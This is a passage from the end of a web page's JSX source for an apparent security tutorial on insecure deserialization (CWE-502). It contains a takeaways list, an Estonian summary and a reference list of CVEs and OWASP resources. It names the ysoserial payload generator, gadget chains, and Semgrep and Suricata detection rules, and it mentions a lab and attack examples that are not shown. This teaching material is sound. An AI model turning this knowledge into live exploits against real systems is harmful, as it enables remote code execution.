                  <code className='text-slate-100'>resolveClass()</code> override, Python&apos;s
                  restricted unpickler).
                </li>
                <li>
                  Real CVEs confirm the pattern repeats — WebLogic (2015, 2017), ThinkPHP (2024),
                  N-able N-central (2025), GPT Academic (2026). Each new application that exposes
                  native deserialization to untrusted input inherits the same attack class.
                </li>
                <li>
                  Detect it in code (Semgrep rules for Java{' '}
                  <code className='text-slate-100'>ObjectInputStream</code>, Python{' '}
                  <code className='text-slate-100'>pickle.loads</code>) and on the wire (Suricata
                  rules matching Java serialization magic bytes).
                </li>
                <li>
                  Test with the ysoserial tool and the docker-compose lab above. The hardened
                  endpoint should reject every payload.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Kokkuvõte eesti keeles</h2>
              <p className='leading-relaxed mb-4'>
                Ebaturvaline deserialiseerimine (CWE-502) on nõrkus, kus rakendus taastab kasutaja
                esitatud bittide järjestusest objekte, kasutades selleks keele omi
                seraliseerimisvorminguid (Java{' '}
                <code className='text-slate-100'>ObjectInputStream</code>, Python{' '}
                <code className='text-slate-100'>pickle</code>, PHP{' '}
                <code className='text-slate-100'>unserialize()</code>). Ründaja saab saata
                spetsiaalselt koostatud jada, mis deserialiseerimisel käivitab suvalise koodi — ilma
                et rakendusse oleks vaja uut koodi lisada. Selleks kasutatakse <em>vidinahelaid</em>{' '}
                (gadget chains), mis koosnevad juba olemasolevatest teegiklassidest.
              </p>
              <p className='leading-relaxed mb-4'>
                Tuntuimad ründed kasutavad Apache Commons Collectionsi teeki (2015. aasta WebLogic-i
                rünne), JDK7u21 ahelat või PHP <code className='text-slate-100'>__wakeup()</code>
                imemeetodeid. Viimastel aastatel on kriitilisi haavatavusi leitud ThinkPHP-s
                (CVE-2024-44902, CVSS 9.8), N-able N-centralis (CVE-2025-8875, CVSS 9.8) ja GPT
                Academicus (CVE-2026-0763, CVSS 9.8).
              </p>
              <p className='leading-relaxed'>
                Parim kaitse on vältida keele omi serialiseerimisvormingute kasutamist usaldamata
                sisendiga — kasutada JSON-i või Protocol Buffersit. Kui see pole võimalik, tuleb
                Java-s rakendada klasside lubamise nimekirja (allow-list)
                <code className='text-slate-100'>resolveClass()</code> meetodi ülekirjutamisega,
                Pythonis kasutada piiratud unpicklerit ja PHP-s allkirjastada andmed enne
                deserialiseerimist. Tuvastuskood (Semgrep) ja võrgureeglid (Suricata) aitavad
                vältida taandarengut. Täielik lokaalne docker-compose labor ja ründenäited on ülal
                inglise keeles.
              </p>
            </section>

            <section>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Sources</h2>
              <ul className='list-disc list-inside space-y-1 text-sm'>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/502.html'
                    rel='noopener noreferrer'
                  >
                    CWE-502 — Deserialization of Untrusted Data
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/'
                    rel='noopener noreferrer'
                  >
                    OWASP Top 10:2021 — A08 Software and Data Integrity Failures
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'
                    rel='noopener noreferrer'
                  >
                    OWASP Cheat Sheet Series — Deserialization
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/frohoff/ysoserial'
                    rel='noopener noreferrer'
                  >
                    ysoserial — Proof-of-concept Java deserialization payload generator
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/ikkisoft/SerialKiller'
                    rel='noopener noreferrer'
                  >
                    SerialKiller — Java deserialization security filter
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/web-security/deserialization'
                    rel='noopener noreferrer'
                  >
                    PortSwigger — Insecure Deserialization (Web Security Academy)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2015-4852'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2015-4852 (Oracle WebLogic T3 deserialization)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2017-10271'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2017-10271 (Oracle WebLogic WLS XMLDecoder)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2024-44902'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2024-44902 (ThinkPHP insecure deserialization)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2025-8875'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2025-8875 (N-able N-central deserialization)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/advisories/GHSA-c2jg-5cp7-6wc7'
                    rel='noopener noreferrer'
                  >
                    GHSA-c2jg-5cp7-6wc7 — Pipecat pickle deserialization RCE
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2026-0763'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2026-0763 (GPT Academic pickle deserialization)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits/'
                    rel='noopener noreferrer'
                  >
                    Google Cloud — Systematically Hunting for Deserialization Exploits
                  </a>
                </li>
              </ul>
            </section>
          </div>
        </div>
      </div>
    </>
  );
}
